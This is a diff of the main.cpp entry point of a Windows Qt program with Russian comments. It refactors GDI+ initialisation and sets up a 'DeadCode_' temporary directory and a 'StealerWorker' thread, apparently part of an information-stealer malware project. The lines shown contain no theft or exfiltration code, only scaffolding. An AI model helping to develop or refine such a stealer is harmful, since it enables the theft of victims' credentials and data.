@@ -1,11 +1,8 @@
-#include <winsock2.h> // Сетевые функции Windows, включается первым
-#define WIN32_LEAN_AND_MEAN // Исключить устаревшие заголовки
-#define GDIPLUS_NO_AUTOINIT // Отключить автоматическую инициализацию GDI+
 #include <windows.h>
 #include <ntstatus.h>
-#include <gdiplus.h>
 #include <iostream>
 #include <mutex>
+#include <gdiplus.h>
 #include <QApplication>
 #include <QThread>
 #include <QDir>
@@ -41,11 +38,11 @@ MainWindow* g_mainWindow = nullptr;
 Gdiplus::GdiplusStartupInput gdiplusStartupInput;
 ULONG_PTR gdiplusToken;
 
+// Точка входа
 int main(int argc, char *argv[]) {
     // Инициализация GDI+
-    Gdiplus::Status gdiStatus = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
-    if (gdiStatus != Gdiplus::Ok) {
-        std::cerr << "GDI+ initialization failed with status: " << static_cast<int>(gdiStatus) << std::endl;
+    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok) {
+        std::cerr << "Не удалось инициализировать GDI+" << std::endl;
         return -1;
     }
 
@@ -54,17 +51,15 @@ int main(int argc, char *argv[]) {
 
     // Создание главного окна
     MainWindow w;
-    g_mainWindow = &w;
+    g_mainWindow = &w; // Установка указателя
     w.show();
 
     // Создание временной директории для StealerWorker
-    QString tempDirBase = QString::fromStdString(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp");
-    QString tempDir = tempDirBase + "\\DeadCode_" + w.generateRandomString(8);
-    QDir dir(tempDir);
-    if (!dir.exists() && !dir.mkpath(tempDir)) {
-        std::cerr << "Failed to create temporary directory: " << tempDir.toStdString() << std::endl;
-        Gdiplus::GdiplusShutdown(gdiplusToken);
-        return -1;
+    QString tempDir = QString::fromStdString(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") +
+                      "\\DeadCode_" + QString::fromStdString(w.generateRandomString(8));
+    QDir dir;
+    if (!dir.exists(tempDir)) {
+        dir.mkpath(tempDir);
     }
 
     // Настройка StealerWorker в отдельном потоке
@@ -88,7 +83,7 @@ int main(int argc, char *argv[]) {
     int result = app.exec();
 
     // Очистка
-    g_mainWindow = nullptr;
+    g_mainWindow = nullptr; // Сброс указателя
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
     return result;
